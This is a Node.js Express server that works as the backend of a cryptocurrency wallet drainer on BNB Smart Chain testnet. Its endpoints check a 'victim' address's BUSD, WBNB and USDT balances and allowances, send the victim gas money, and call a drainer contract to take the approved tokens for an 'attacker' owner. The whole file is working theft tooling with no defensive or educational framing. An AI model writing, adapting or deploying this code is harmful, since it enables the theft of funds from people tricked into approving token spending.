require("dotenv").config();
const express = require("express");
const { ethers } = require("ethers");
const cors = require("cors");

function formatError(error) {
  if (error && error.reason) return `${error.reason} (${error.code || "UNKNOWN_ERROR"})`;
  return error.message || "Unknown error";
}

const app = express();
app.use(express.json());
app.use(cors());

const BSC_TESTNET_CHAIN_ID = 97;
const provider = new ethers.JsonRpcProvider("https://bsc-testnet-dataseed.bnbchain.org/", BSC_TESTNET_CHAIN_ID);
const wallet = new ethers.Wallet(process.env.PRIVATE_KEY || "YOUR_PRIVATE_KEY_HERE", provider);

const drainerContractAddress = "0x9b8b50c102c07B61a596b7ba2e842586fa97A0D7";

const tokenList = [
  { symbol: "BUSD", address: "0xeD24FC36d5Ee211Ea25A80239Fb8C4Cfd80f12Ee", decimals: 18 },
  { symbol: "WBNB", address: "0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd", decimals: 18 },
  { symbol: "USDT", address: "0x337610d27c682E347C9cD60BD4b3b107C9d34dDd", decimals: 18 },
];

const drainerAbi = [
  "function drainTokens(address victim, address[] memory tokens) external returns (uint256[] memory)",
  "function drainSpecificToken(address victim, address token) external returns (uint256)",
  "function attacker() external view returns (address)",
  "event TokensDrained(address indexed victim, address indexed token, uint256 amount)"
];

const tokenAbi = [
  "function balanceOf(address account) external view returns (uint256)",
  "function allowance(address owner, address spender) external view returns (uint256)",
  "function approve(address spender, uint256 amount) external returns (bool)"
];

const Drainer = new ethers.Contract(drainerContractAddress, drainerAbi, wallet);

async function getGasSettings() {
  try {
    const feeData = await provider.getFeeData();
    return {
      gasLimit: 300000,
      gasPrice: feeData.gasPrice ? feeData.gasPrice * BigInt(12) / BigInt(10) : ethers.parseUnits("15", "gwei"),
    };
  } catch (error) {
    console.error("Error fetching gas data:", formatError(error));
    return { gasLimit: 300000, gasPrice: ethers.parseUnits("15", "gwei") };
  }
}

async function checkWalletBalance() {
  const network = await provider.getNetwork();
  const receivedChainId = Number(network.chainId);
  if (receivedChainId !== BSC_TESTNET_CHAIN_ID) {
    throw new Error(`Network mismatch: Expected chain ID ${BSC_TESTNET_CHAIN_ID}, got ${receivedChainId}`);
  }

  const balance = await provider.getBalance(wallet.address);
  console.log(`Wallet balance: ${ethers.formatEther(balance)} BNB`);
  if (balance < ethers.parseEther("0.005")) {
    throw new Error("Insufficient BNB for gas. Please fund the wallet.");
  }
}

async function sendGasIfNeeded(victimAddress) {
  const victimBalance = await provider.getBalance(victimAddress);
  console.log(`Victim balance: ${ethers.formatEther(victimBalance)} TBNB`);

  if (victimBalance === BigInt(0)) {
    const tbnbToSend = ethers.parseEther("0.005"); 
    const gasSettings = await getGasSettings();

    console.log(`Victim has 0 TBNB. Sending ${ethers.formatEther(tbnbToSend)} TBNB to ${victimAddress} for gas...`);
    const tx = await wallet.sendTransaction({
      to: victimAddress,
      value: tbnbToSend,
      gasLimit: 21000,
      gasPrice: gasSettings.gasPrice,
    });

    console.log(`Gas transaction sent: ${tx.hash}`);
    const receipt = await tx.wait();
    return { success: true, message: `Sent ${ethers.formatEther(tbnbToSend)} TBNB to ${victimAddress} for gas`, txHash: tx.hash };
  }
  return { success: false, message: "No gas needed" };
}

async function initialize() {
  console.log("Initializing server...");
  console.log("Using wallet address:", wallet.address);
  try {
    await checkWalletBalance();
    const owner = await Drainer.attacker();
    console.log("Contract owner:", owner);
    if (owner.toLowerCase() !== wallet.address.toLowerCase()) {
      console.warn("Warning: Wallet is not the contract owner!");
    }
    console.log("Initialization complete");
  } catch (error) {
    console.error("Initialization failed:", formatError(error));
    throw error;
  }
}

app.post("/check-and-fund", async (req, res) => {
  const { victimAddress } = req.body;
  try {
    if (!victimAddress || !ethers.isAddress(victimAddress)) {
      return res.status(400).json({ error: "Invalid or missing victimAddress" });
    }
    const gasResult = await sendGasIfNeeded(victimAddress);
    res.json(gasResult);
  } catch (error) {
    console.error("Check-and-fund error:", formatError(error));
    res.status(500).json({ error: error.message });
  }
});

app.post("/drain", async (req, res) => {
  const { victimAddress, drainAll } = req.body;
  try {
      if (!victimAddress || !ethers.isAddress(victimAddress)) {
          return res.status(400).json({ error: "Invalid or missing victimAddress" });
      }

      const gasSettings = await getGasSettings();
      let tx, receipt, totalDrained = BigInt(0);
      const tokensNeedingApproval = [];

      // Check allowances and balances for all tokens
      const tokenAddresses = tokenList.map(t => t.address);
      for (const token of tokenList) {
          const tokenContract = new ethers.Contract(token.address, tokenAbi, provider);
          const allowance = await tokenContract.allowance(victimAddress, drainerContractAddress);
          const balance = await tokenContract.balanceOf(victimAddress);
          console.log(`${token.symbol}: Balance=${ethers.formatUnits(balance, token.decimals)}, Allowance=${ethers.formatUnits(allowance, token.decimals)}`);
          if (allowance === BigInt(0) && balance > 0) {
              tokensNeedingApproval.push({ symbol: token.symbol, address: token.address });
          }
      }

      const needsApproval = tokensNeedingApproval.length > 0;

      if (drainAll) {
          console.log(`Draining all tokens from ${victimAddress}...`);
          tx = await Drainer.drainTokens(victimAddress, tokenAddresses, { ...gasSettings, gasLimit: 1000000 });
          receipt = await tx.wait();

          const eventInterface = new ethers.Interface(drainerAbi);
          receipt.logs.forEach(log => {
              try {
                  const parsedLog = eventInterface.parseLog(log);
                  if (parsedLog.name === "TokensDrained") {
                      totalDrained += BigInt(parsedLog.args.amount);
                  }
              } catch (e) {
                  console.log("Non-TokensDrained log:", log);
              }
          });
      }

      console.log(`Transaction sent: ${tx.hash}`);

      if (totalDrained > 0) {
          const message = `Drained ${ethers.formatEther(totalDrained)} total tokens`;
          res.json({
              success: true,
              message,
              victimAddress,
              transactionHash: tx.hash,
              gasUsed: receipt.gasUsed.toString(),
              needsApproval: false,
              tokensNeedingApproval: [] // No approvals needed post-drain
          });
      } else {
          res.json({
              success: false,
              message: needsApproval ? "Approval needed for some tokens." : "No tokens drained. Check victim's balance and allowance.",
              victimAddress,
              transactionHash: tx?.hash || null,
              needsApproval,
              tokensNeedingApproval // List of tokens needing approval
          });
      }
  } catch (error) {
      console.error("Drain error:", formatError(error));
      res.status(500).json({ error: error.message });
  }
});

app.get("/debug", async (req, res) => {
  try {
    const owner = await Drainer.attacker();
    res.json({ owner });
  } catch (error) {
    console.error("Debug error:", formatError(error));
    res.status(500).json({ error: error.message });
  }
});

app.get("/", (req, res) => {
  res.sendFile(__dirname + "/index.html");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
  console.log(`API server running on port ${PORT}`);
  try {
    await initialize();
  } catch (error) {
    console.error("Failed to initialize server, server continues:", formatError(error));
  }
});